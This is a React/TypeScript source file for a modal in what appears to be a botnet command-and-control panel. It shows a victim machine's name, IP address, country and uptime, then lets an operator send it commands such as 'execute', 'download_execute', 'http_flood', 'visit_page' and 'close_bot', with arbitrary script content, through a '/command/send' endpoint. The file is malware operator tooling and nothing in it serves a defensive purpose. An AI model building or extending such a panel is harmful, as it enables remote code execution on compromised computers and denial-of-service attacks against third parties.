import React, { useState } from 'react';
import { UserInfo } from '../types/types';
import request from '../axios';
import dayjs from 'dayjs';

interface Props {
  isOpen: boolean;
  user: UserInfo;
  setIsOpen: (value: boolean) => void;
  handleProcess: (user: UserInfo, type: string, script: string) => void;
}

const TransferModal: React.FC<Props> = ({ isOpen, user, setIsOpen, handleProcess }) => {
  const [textContent, setTextContent] = useState('');
  const [selectedOption, setSelectedOption] = useState('');

  if (!isOpen) return null;

  const sendCommand = () => {
    if (!selectedOption) return;
    request({
      url: '/command/send',
      method: 'POST',
      data: {
        user,
        type: selectedOption,
        script: textContent,
      },
    }).then(() => setIsOpen(false));
  };

  const disconnectClient = () => {
    request({
      url: '/command/disconnect-client',
      method: 'POST',
      data: {
        ipAddress: user.ipAddress,
        computerName: user.computerName,
      },
    }).then(() => setIsOpen(false));
  };

  const formatTimestamp = (value: string) => {
    return dayjs(value).isValid() ? dayjs(value).fromNow() : value;
  };

  return (
    <div className="fixed inset-0 bg-gray-500 bg-opacity-75 flex justify-center items-center z-[9999]">
      <div className="bg-white p-6 rounded-lg shadow-lg max-w-lg w-full">
        <h2 className="text-xl font-semibold mb-4">Send Command</h2>

        {(["computerName", "ipAddress", "country", "status"] as const).map((field, i) => (
          <div key={i} className="mb-2">
            <strong className="text-gray-700 capitalize">{field.replace(/([A-Z])/g, ' $1')}:</strong>
            <div>{(user as any)[field]}</div>
          </div>
        ))}

        <div className="mb-2">
          <strong className="text-gray-700">Last Active Time:</strong>
          <div>{formatTimestamp(user.lastActiveTime)}</div>
        </div>

        <div className="mb-2">
          <strong className="text-gray-700">Uptime:</strong>
          <div>{formatTimestamp(user.additionalSystemDetails)}</div>
        </div>

        <div className="mb-4">
          <label className="font-semibold text-gray-700">Command Type</label>
          <select
            value={selectedOption}
            onChange={(e) => setSelectedOption(e.target.value)}
            className="w-full border rounded p-2 mt-1"
          >
            <option value="">Select command</option>
            {[
              "messagebox", "execute", "download_execute", "http_flood",
              "visit_page", "close_bot", "shutdown", "restart",
              "hibernate", "logoff", "abort"
            ].map((cmd) => (
              <option key={cmd} value={cmd}>{cmd.replace('_', ' ')}</option>
            ))}
          </select>
        </div>

        <div className="mb-4">
          <label className="font-semibold text-gray-700">Script Content</label>
          <textarea
            className="w-full border rounded p-2 h-20"
            value={textContent}
            onChange={(e) => setTextContent(e.target.value)}
          />
        </div>

        <div className="flex justify-end space-x-2">
          <button onClick={sendCommand} className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
            Send
          </button>
          <button onClick={disconnectClient} className="bg-yellow-500 text-white px-4 py-2 rounded hover:bg-yellow-600">
            Disconnect
          </button>
          <button onClick={() => setIsOpen(false)} className="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600">
            Close
          </button>
        </div>
      </div>
    </div>
  );
};

export default TransferModal;
